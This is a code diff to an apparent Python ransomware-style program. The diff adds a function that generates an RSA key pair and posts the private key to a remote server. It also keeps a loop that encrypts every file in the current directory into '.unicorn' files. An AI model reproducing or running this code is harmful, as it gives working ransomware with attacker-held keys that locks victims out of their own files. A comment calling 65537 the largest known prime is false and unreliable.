@@ -4,12 +4,60 @@ import encrypt
 import decrypt
 import json
 import constant
+import requests
 from base64 import b64encode
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 
 
+def generateKeyForce():
+    #URL to the node.js server
+    URL = 'https://unicorntheoriest.me:23245/server'
+    
+    #public exponent 65537 is the largest known prime number making it large enought to avoid attacks
+    #key size is set to 2048 bits
+    #backend implements RSABackend
+    print(" > Lets go find some unicorn together!")
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+    #serialize the key
+    print(" > I have found my unicorn, what about you?")
+    privPem = private_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+        )
+        
+    print(" > Seem like you also have your own unicorn yay!")
+    public_key = private_key.public_key()
+    pubPem = public_key.public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+
+    #post to node.js server
+    customHeader = {'Appkey': 'UnicornEncryption'}
+    getRequest = requests.post(URL, data={'private_key': privPem, 'public_key': pubPem }, files=[('file', privPem), ('file', pubPem)], headers=customHeader)
+    if (getRequest.text == "Insert Complete"):
+        #open private.pem key using 'write bytes' and write it
+        #close key file
+        fprivate=open(constant.PRIVATE_PEM, 'wb')
+        fprivate.write(privPem)
+        fprivate.close()
+        
+        #open public.pem key using 'write bytes' and write
+        #close public key file
+        fpublic=open(constant.PUBLIC_PEM, 'wb')
+        fpublic.write(pubPem)
+        fpublic.close()
+    else:
+        print("Something happened to the place where the unicorn lives")
+    
+    
 def generateKey():
     try:
         #try to load open a private key
@@ -128,7 +176,7 @@ while(flag):
                 file_List = os.listdir()
                 for x in file_List:
                     if x not in ("constant.py", "encrypt.py", "decrypt.py", "main.py",
-                                 constant.PRIVATE_PEM, constant.PUBLIC_PEM):
+                                 constant.PRIVATE_PEM, constant.PUBLIC_PEM, "myUnlock.py"):
                         if (not x.endswith('.unicorn')):
                             if (os.path.isfile(x)):
                                 encryptionProcess(x)
@@ -143,7 +191,7 @@ while(flag):
             else:
                 decrypt.MyfileDecryptMAC("./" + file +".unicorn")
         elif cmd == "create":
-            generateKey()
+            generateKeyForce()
         elif cmd == "cd":
             os.chdir(file)
         else: #if user inputs anything but given commands:
